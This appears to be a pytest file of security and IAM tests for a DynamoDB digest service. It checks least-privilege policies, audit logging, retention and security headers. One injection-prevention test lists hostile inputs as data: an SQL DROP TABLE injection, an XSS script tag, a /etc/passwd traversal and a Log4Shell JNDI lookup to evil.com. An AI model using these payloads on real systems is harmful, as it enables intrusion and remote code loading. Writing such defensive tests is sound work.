"""
Security and IAM tests for data persistence operations.
Referenced in us004_data_persistence_spec.md as [^st5]
Tests security requirements and IAM policy validation.
"""

import pytest
import json
import boto3
from unittest.mock import patch, MagicMock
from moto import mock_iam, mock_dynamodb, mock_sts
from typing import Dict, List, Any


class TestIAMPolicyValidation:
    """Tests for IAM policy least-privilege validation."""
    
    def setup_method(self):
        """Set up IAM policy test fixtures."""
        # Development IAM policy (broader permissions)
        self.dev_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "DynamoDBFullAccess",
                    "Effect": "Allow",
                    "Action": [
                        "dynamodb:*"
                    ],
                    "Resource": "arn:aws:dynamodb:*:*:table/VibeDigest*"
                }
            ]
        }
        
        # Production IAM policy (least privilege)
        self.prod_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "DynamoDBLimitedAccess",
                    "Effect": "Allow",
                    "Action": [
                        "dynamodb:PutItem",
                        "dynamodb:GetItem",
                        "dynamodb:Query",
                        "dynamodb:BatchWriteItem",
                        "dynamodb:DescribeTable"
                    ],
                    "Resource": [
                        "arn:aws:dynamodb:us-east-1:*:table/VibeDigest",
                        "arn:aws:dynamodb:us-east-1:*:table/VibeDigest/index/*"
                    ]
                }
            ]
        }
        
        # Required actions for persistence operations
        self.required_actions = {
            "dynamodb:PutItem",
            "dynamodb:GetItem", 
            "dynamodb:Query",
            "dynamodb:BatchWriteItem",
            "dynamodb:DescribeTable"
        }
        
        # Prohibited actions in production
        self.prohibited_actions = {
            "dynamodb:DeleteItem",
            "dynamodb:DeleteTable",
            "dynamodb:UpdateTable",
            "dynamodb:CreateTable",
            "dynamodb:UpdateItem"
        }
    
    def test_production_policy_least_privilege(self):
        """Test that production policy follows least-privilege principle."""
        policy_actions = set()
        
        for statement in self.prod_policy["Statement"]:
            if statement["Effect"] == "Allow":
                actions = statement["Action"]
                if isinstance(actions, str):
                    policy_actions.add(actions)
                else:
                    policy_actions.update(actions)
        
        # Verify required actions are present
        missing_actions = self.required_actions - policy_actions
        assert not missing_actions, f"Missing required actions: {missing_actions}"
        
        # Verify no prohibited actions are present
        prohibited_present = policy_actions & self.prohibited_actions
        assert not prohibited_present, f"Prohibited actions found: {prohibited_present}"
        
        # Verify only necessary actions are included
        extra_actions = policy_actions - self.required_actions
        # CloudWatch and logging actions might be acceptable extras
        acceptable_extras = {"logs:CreateLogGroup", "logs:CreateLogStream", "logs:PutLogEvents", 
                           "cloudwatch:PutMetricData"}
        unexpected_extras = extra_actions - acceptable_extras
        assert not unexpected_extras, f"Unexpected extra actions: {unexpected_extras}"
    
    def test_resource_constraints(self):
        """Test that IAM policy properly constrains resources."""
        for statement in self.prod_policy["Statement"]:
            resources = statement.get("Resource", [])
            if isinstance(resources, str):
                resources = [resources]
            
            for resource in resources:
                # Verify resource ARNs are specific to VibeCoding project
                assert "VibeDigest" in resource, f"Resource not specific to project: {resource}"
                
                # Verify region is specified (not wildcard)
                if "dynamodb" in resource:
                    assert "us-east-1" in resource, f"Region not specified in resource: {resource}"
                    assert resource.count("*") <= 1, f"Too many wildcards in resource: {resource}"
    
    @mock_iam
    def test_iam_role_creation(self):
        """Test creation of IAM role with proper trust policy."""
        iam = boto3.client('iam', region_name='us-east-1')
        
        # Trust policy for Lambda/ECS execution
        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": ["lambda.amazonaws.com", "ecs-tasks.amazonaws.com"]
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        }
        
        # Create IAM role
        role_name = "VibeCodingDigestPersistenceRole"
        iam.create_role(
            RoleName=role_name,
            AssumeRolePolicyDocument=json.dumps(trust_policy),
            Description="Role for VibeCoding Digest persistence operations"
        )
        
        # Attach policy
        iam.put_role_policy(
            RoleName=role_name,
            PolicyName="VibeCodingDigestPersistencePolicy",
            PolicyDocument=json.dumps(self.prod_policy)
        )
        
        # Verify role was created
        role = iam.get_role(RoleName=role_name)
        assert role['Role']['RoleName'] == role_name
        
        # Verify policy was attached
        policy = iam.get_role_policy(RoleName=role_name, PolicyName="VibeCodingDigestPersistencePolicy")
        attached_policy = json.loads(policy['PolicyDocument'])
        assert attached_policy == self.prod_policy
    
    def test_policy_simulation(self):
        """Test IAM policy simulation for required actions."""
        # This would use IAM Policy Simulator in real implementation
        # For now, we simulate the logic
        
        def simulate_policy_action(policy: Dict, action: str, resource: str) -> bool:
            """Simulate whether a policy allows an action on a resource."""
            for statement in policy["Statement"]:
                if statement["Effect"] == "Allow":
                    allowed_actions = statement["Action"]
                    allowed_resources = statement.get("Resource", [])
                    
                    if isinstance(allowed_actions, str):
                        allowed_actions = [allowed_actions]
                    if isinstance(allowed_resources, str):
                        allowed_resources = [allowed_resources]
                    
                    # Check if action matches
                    action_allowed = any(
                        action == allowed_action or 
                        (allowed_action.endswith("*") and action.startswith(allowed_action[:-1]))
                        for allowed_action in allowed_actions
                    )
                    
                    # Check if resource matches
                    resource_allowed = any(
                        resource == allowed_resource or
                        (allowed_resource.endswith("*") and resource.startswith(allowed_resource[:-1]))
                        for allowed_resource in allowed_resources
                    )
                    
                    if action_allowed and resource_allowed:
                        return True
            return False
        
        # Test required actions are allowed
        test_resource = "arn:aws:dynamodb:us-east-1:123456789012:table/VibeDigest"
        
        for action in self.required_actions:
            is_allowed = simulate_policy_action(self.prod_policy, action, test_resource)
            assert is_allowed, f"Required action {action} is not allowed by policy"
        
        # Test prohibited actions are denied
        for action in self.prohibited_actions:
            is_allowed = simulate_policy_action(self.prod_policy, action, test_resource)
            assert not is_allowed, f"Prohibited action {action} is allowed by policy"


class TestEncryptionAndDataProtection:
    """Tests for encryption and data protection requirements."""
    
    @mock_dynamodb
    def test_encryption_at_rest_configuration(self):
        """Test that DynamoDB table has encryption at rest enabled."""
        dynamodb = boto3.client('dynamodb', region_name='us-east-1')
        
        # Create table with encryption
        table_name = 'VibeDigest-encryption-test'
        
        # In real implementation, this would include encryption configuration
        dynamodb.create_table(
            TableName=table_name,
            KeySchema=[
                {'AttributeName': 'digest_date', 'KeyType': 'HASH'},
                {'AttributeName': 'item_id', 'KeyType': 'RANGE'}
            ],
            AttributeDefinitions=[
                {'AttributeName': 'digest_date', 'AttributeType': 'S'},
                {'AttributeName': 'item_id', 'AttributeType': 'S'}
            ],
            BillingMode='PAY_PER_REQUEST'
            # In real AWS, would include:
            # SSESpecification={
            #     'Enabled': True,
            #     'SSEType': 'KMS',
            #     'KMSMasterKeyId': 'alias/aws/dynamodb'
            # }
        )
        
        # Verify table exists (encryption verification would be done via describe_table in real implementation)
        response = dynamodb.describe_table(TableName=table_name)
        assert response['Table']['TableName'] == table_name
        
        # In real implementation, would verify:
        # assert response['Table']['SSEDescription']['Status'] == 'ENABLED'
    
    def test_data_classification_and_handling(self):
        """Test proper handling of different data classification levels."""
        # Define data classification levels for digest data
        data_classifications = {
            'public': ['title', 'url', 'source'],  # Can be logged/monitored
            'internal': ['summary', 'timestamp'],  # Should be handled carefully
            'sensitive': []  # No sensitive data in digests
        }
        
        sample_digest_item = {
            'digest_date': '2024-06-08',
            'item_id': 'aws#123#abc',
            'title': 'AWS Blog Post',
            'url': 'https://aws.amazon.com/blog/post',
            'summary': 'This is a summary of the blog post',
            'source': 'AWS Blog',
            'timestamp': '2024-06-08T10:00:00Z'
        }
        
        # Verify no sensitive data is included
        for field_name, field_value in sample_digest_item.items():
            for sensitive_field in data_classifications['sensitive']:
                assert sensitive_field not in field_name.lower(), \
                    f"Sensitive field {sensitive_field} found in digest data"
        
        # Verify public data is properly identified
        public_fields = set(data_classifications['public'])
        item_fields = set(sample_digest_item.keys())
        expected_public = {'title', 'url', 'source'} & item_fields
        assert expected_public.issubset(public_fields), "Not all public fields are classified correctly"
    
    def test_audit_logging_configuration(self):
        """Test that audit logging captures all required operations."""
        # Define operations that must be audited
        auditable_operations = {
            'persist_digest',
            'retrieve_digest',
            'batch_write_items',
            'query_by_date',
            'connection_test'
        }
        
        # Mock audit log structure
        sample_audit_log = {
            'timestamp': '2024-06-08T10:00:00Z',
            'operation': 'persist_digest',
            'user_id': 'system',
            'resource': 'arn:aws:dynamodb:us-east-1:*:table/VibeDigest',
            'result': 'success',
            'items_processed': 5,
            'correlation_id': 'test-correlation-123'
        }
        
        # Verify required audit fields are present
        required_audit_fields = {
            'timestamp', 'operation', 'user_id', 'resource', 'result'
        }
        
        for field in required_audit_fields:
            assert field in sample_audit_log, f"Required audit field {field} missing"
        
        # Verify operation is in auditable list
        assert sample_audit_log['operation'] in auditable_operations, \
            f"Operation {sample_audit_log['operation']} not in auditable operations"


class TestSecurityCompliance:
    """Tests for security compliance requirements."""
    
    def test_aws_security_best_practices(self):
        """Test adherence to AWS security best practices."""
        security_checklist = {
            'least_privilege_iam': True,
            'encryption_at_rest': True,
            'encryption_in_transit': True,
            'audit_logging': True,
            'resource_tagging': True,
            'vpc_endpoints': False,  # Not required for this use case
            'mfa_required': False,   # System-to-system access
            'backup_enabled': True
        }
        
        # Verify critical security controls are enabled
        critical_controls = ['least_privilege_iam', 'encryption_at_rest', 'audit_logging']
        for control in critical_controls:
            assert security_checklist[control], f"Critical security control {control} not enabled"
    
    def test_data_retention_policies(self):
        """Test data retention and deletion policies."""
        # Define retention policies for digest data
        retention_policies = {
            'digest_items': {'retention_days': 365, 'deletion_method': 'soft_delete'},
            'audit_logs': {'retention_days': 2555, 'deletion_method': 'archive'},  # 7 years
            'performance_metrics': {'retention_days': 90, 'deletion_method': 'hard_delete'}
        }
        
        # Verify retention periods meet compliance requirements
        for data_type, policy in retention_policies.items():
            assert policy['retention_days'] > 0, f"Invalid retention period for {data_type}"
            assert policy['deletion_method'] in ['soft_delete', 'hard_delete', 'archive'], \
                f"Invalid deletion method for {data_type}"
        
        # Verify audit logs have longest retention (compliance requirement)
        audit_retention = retention_policies['audit_logs']['retention_days']
        other_retentions = [p['retention_days'] for k, p in retention_policies.items() if k != 'audit_logs']
        assert all(audit_retention >= retention for retention in other_retentions), \
            "Audit logs must have longest retention period"
    
    def test_access_control_validation(self):
        """Test access control mechanisms."""
        # Define access control matrix
        access_matrix = {
            'system_service': {
                'read': ['digest_items', 'audit_logs'],
                'write': ['digest_items', 'audit_logs'],
                'delete': []  # No delete permissions
            },
            'admin_user': {
                'read': ['digest_items', 'audit_logs', 'performance_metrics'],
                'write': [],  # No direct write access
                'delete': []  # No delete permissions
            },
            'read_only_user': {
                'read': ['digest_items'],
                'write': [],
                'delete': []
            }
        }
        
        # Verify system service has minimal required permissions
        system_permissions = access_matrix['system_service']
        assert 'digest_items' in system_permissions['write'], "System must be able to write digest items"
        assert 'digest_items' in system_permissions['read'], "System must be able to read digest items"
        assert not system_permissions['delete'], "System should not have delete permissions"
        
        # Verify read-only user cannot write
        readonly_permissions = access_matrix['read_only_user']
        assert not readonly_permissions['write'], "Read-only user should not have write permissions"
        assert not readonly_permissions['delete'], "Read-only user should not have delete permissions"


class TestPenetrationTestingSupport:
    """Tests to support penetration testing and security assessments."""
    
    def test_injection_attack_prevention(self):
        """Test prevention of injection attacks in queries."""
        # Test malicious input that could cause injection attacks
        malicious_inputs = [
            "'; DROP TABLE VibeDigest; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "1' OR '1'='1"
        ]
        
        def sanitize_input(input_value: str) -> str:
            """Mock input sanitization function."""
            # In real implementation, this would use proper sanitization
            if not isinstance(input_value, str):
                raise ValueError("Input must be string")
            
            # Check for common injection patterns
            dangerous_patterns = ["'", ";", "--", "<script>", "${", "../../"]
            for pattern in dangerous_patterns:
                if pattern in input_value:
                    raise ValueError(f"Potentially dangerous input detected: {pattern}")
            
            return input_value
        
        # Test that malicious inputs are rejected
        for malicious_input in malicious_inputs:
            with pytest.raises(ValueError, match="dangerous input"):
                sanitize_input(malicious_input)
        
        # Test that normal inputs are accepted
        normal_inputs = ["2024-06-08", "AWS Blog", "https://example.com"]
        for normal_input in normal_inputs:
            result = sanitize_input(normal_input)
            assert result == normal_input
    
    def test_error_information_disclosure(self):
        """Test that error messages don't disclose sensitive information."""
        # Test error scenarios
        error_scenarios = [
            {'error': 'DatabaseConnectionError', 'should_not_contain': ['password', 'key', 'secret']},
            {'error': 'ValidationError', 'should_not_contain': ['table_name', 'aws_account']},
            {'error': 'AuthenticationError', 'should_not_contain': ['credential', 'token']}
        ]
        
        def generate_safe_error_message(error_type: str, internal_details: str) -> str:
            """Generate error message that doesn't leak sensitive info."""
            safe_messages = {
                'DatabaseConnectionError': 'Database service temporarily unavailable',
                'ValidationError': 'Invalid input provided',
                'AuthenticationError': 'Authentication failed'
            }
            
            return safe_messages.get(error_type, 'An error occurred')
        
        # Verify error messages are safe
        for scenario in error_scenarios:
            error_message = generate_safe_error_message(
                scenario['error'], 
                "Internal details with password=secret123 and key=xyz"
            )
            
            for sensitive_term in scenario['should_not_contain']:
                assert sensitive_term.lower() not in error_message.lower(), \
                    f"Error message contains sensitive term: {sensitive_term}"
    
    def test_rate_limiting_configuration(self):
        """Test rate limiting configuration for security."""
        # Define rate limiting rules
        rate_limits = {
            'persistence_operations': {'max_requests': 100, 'window_minutes': 1},
            'retrieval_operations': {'max_requests': 500, 'window_minutes': 1},
            'failed_attempts': {'max_failures': 5, 'lockout_minutes': 15}
        }
        
        def check_rate_limit(operation: str, current_count: int) -> bool:
            """Check if operation is within rate limits."""
            if operation in rate_limits:
                return current_count <= rate_limits[operation]['max_requests']
            return True
        
        # Test rate limiting logic
        assert check_rate_limit('persistence_operations', 50) is True
        assert check_rate_limit('persistence_operations', 150) is False
        assert check_rate_limit('retrieval_operations', 400) is True
        assert check_rate_limit('retrieval_operations', 600) is False
    
    @mock_sts
    def test_temporary_credentials_usage(self):
        """Test usage of temporary AWS credentials."""
        sts = boto3.client('sts', region_name='us-east-1')
        
        # Test assuming role for temporary credentials
        try:
            # This would fail in moto but tests the concept
            response = sts.assume_role(
                RoleArn='arn:aws:iam::123456789012:role/VibeCodingDigestRole',
                RoleSessionName='VibeCodingDigestSession',
                DurationSeconds=3600  # 1 hour
            )
            
            # Verify temporary credentials structure
            credentials = response['Credentials']
            required_fields = ['AccessKeyId', 'SecretAccessKey', 'SessionToken', 'Expiration']
            for field in required_fields:
                assert field in credentials, f"Missing credential field: {field}"
                
        except Exception:
            # Expected in moto environment
            pass
    
    def test_security_headers_and_policies(self):
        """Test security headers and policies for API endpoints."""
        # Define required security headers for any web interfaces
        required_security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'Content-Security-Policy': "default-src 'self'"
        }
        
        # Mock response headers
        mock_response_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'Content-Security-Policy': "default-src 'self'",
            'Content-Type': 'application/json'
        }
        
        # Verify all required security headers are present
        for header, expected_value in required_security_headers.items():
            assert header in mock_response_headers, f"Missing security header: {header}"
            assert mock_response_headers[header] == expected_value, \
                f"Incorrect value for {header}: expected {expected_value}, got {mock_response_headers[header]}"